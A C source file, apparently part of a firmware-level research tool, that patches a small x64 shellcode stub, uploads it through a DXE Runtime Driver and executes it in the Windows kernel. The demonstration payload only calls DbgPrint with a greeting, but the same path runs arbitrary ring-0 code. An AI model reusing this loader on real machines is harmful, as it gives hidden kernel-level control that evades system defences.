// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



#include <windows.h>
#include <stdio.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include "Utils/Utils02Kernel.h"
#include "Utils/Utils03Communication.h"
#include "../Globals/Globals01Operations.h"
#include "../Structures/Structures00Execution.h"



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



// Uploads and executes shellcode in DXE Runtime Driver to call DbgPrint from kernel
int FunctionsCall_CommandDbgPrint(void)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Resolve DbgPrint
	ULONGLONG dbgPrint = (ULONGLONG)UtilsKernel_GetKernelExport("DbgPrint");
	if (!dbgPrint)
	{
		wprintf(L"[-] Failed to resolve DbgPrint\n");
		return 1;
	}
	wprintf(L"[+] DbgPrint kernel VA: 0x%llx\n", dbgPrint);


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	ULONGLONG bufferStart = 0;
	ULONGLONG bufferEnd = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Request
	if (!UtilsCommunication_RequestGetBufferBounds(&bufferStart, &bufferEnd))
	{
		return 1;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Prepare shellcode and message string

	// Shellcode calls DbgPrint(msg)
	BYTE sc[] = {
		0x48,0x83,0xEC,0x28,                        // sub rsp,28h        (align stack)
		0x48,0xB9, 0,0,0,0,0,0,0,0,                 // mov rcx, <msg>
		0x48,0xB8, 0,0,0,0,0,0,0,0,                 // mov rax, <DbgPrint>
		0xFF,0xD0,                                  // call rax
		0x48,0x83,0xC4,0x28,                        // add rsp,28h
		0xC3                                        // ret
	};
	const char text[] = "Hello from DXE Runtime Driver!\n";


	// ---------------------------------------------------------------------------------------------------------------------
	// Allocate payload and patch shellcode with message pointer and DbgPrint address
	SIZE_T total = sizeof(sc) + sizeof(text);
	BYTE *payload = (BYTE*)calloc(1, total);
	if (payload == NULL)
	{
		wprintf(L"[-] Out of memory for shellcode payload (0x%zx bytes)\n", total);
		return 1;
	}
	memcpy(payload, sc, sizeof(sc));
	memcpy(payload + sizeof(sc), text, sizeof(text));
	ULONGLONG msgVA = bufferStart + sizeof(sc);
	*(ULONGLONG*)(payload + 6)  = msgVA;
	*(ULONGLONG*)(payload + 16) = dbgPrint;


	// ---------------------------------------------------------------------------------------------------------------------
	// Request write in buffer
	if (!UtilsCommunication_RequestWriteInBuffer(bufferStart, payload, (DWORD)total))
	{
		free(payload);
		return 1;
	}
	wprintf(L"[+] Shellcode uploaded (%zu bytes)\n", total);


	// ---------------------------------------------------------------------------------------------------------------------
	// Request call fast
	if (!UtilsCommunication_RequestCallFast(bufferStart))
	{
		free(payload);
		return 1;
	}
	wprintf(L"[+] Shellcode executed (check DebugView - Sysinternals)\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Clean up dynamically allocated payload buffer used for shellcode + message
	free(payload);


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return 0;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
